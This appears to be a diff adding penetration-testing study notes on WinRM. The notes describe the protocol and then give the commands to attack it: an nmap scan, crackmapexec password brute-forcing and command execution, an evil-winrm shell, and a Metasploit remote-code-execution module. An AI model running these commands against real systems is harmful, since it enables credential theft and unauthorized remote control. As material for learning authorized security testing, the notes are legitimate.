@@ -1,0 +1,45 @@
+> Windows Remote Management (WinRM) is a Windows remote management
+  protocol that can be used to facilitate remote access with Windows systems over
+  HTTP(S).
+> Microsoft implemented WinRM in to Windows in order to make life easier for
+  system administrators.
+> WinRM is typically used in the following ways:
+  > Remotely access and interact with Windows hosts on a local network.
+  > Remotely access and execute commands on Windows systems.
+  > Manage and configure Windows systems remotely.
+> WinRM typically uses TCP port 5985 and 5986 (HTTPS).
+
+> WinRM implements access control and security for communication between
+  systems through various forms of authentication.
+> We can utilize a utility called “crackmapexec” to perform a brute-force on
+  WinRM in order to identify users and their passwords as well as execute
+  commands on the target system.
+> We can also utilize a ruby script called “evil-winrm” to obtain a command shell
+  session on the target system.
+  
+Exploiting WinRM:
+
+> nmap -sV -p 5985-5986 <IP>
+  > Banner could be different than WinRM
+
+Brute Force with crackmapexec:
+> crackmapexec winrm <IP> -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+
+Use crackmapexec for commands:
+> crackmapexec winrm <IP> -u administrator -p <password> -x "<comamnd>"       // systeminfo for sysinfo
+
+Use evil-winrm for reverse shell:
+> evil-winrm -u administrator -p '<password>' -i <IP>
+
+Msfconsole Remote Code Execution with WinRM:
+> msfconsole -q
+  > search winrm_script
+    > use exploit/windows/winrm/winrm_script_exec
+    > set RHOSTS <IP>
+    > set RPORT if needed
+    > set LHOST
+    > set LPORT
+    > set FORCE_VBS true        // Force the module to use the VBS CmdStager
+    > set Username <username>
+    > set Password <password>
+    > run
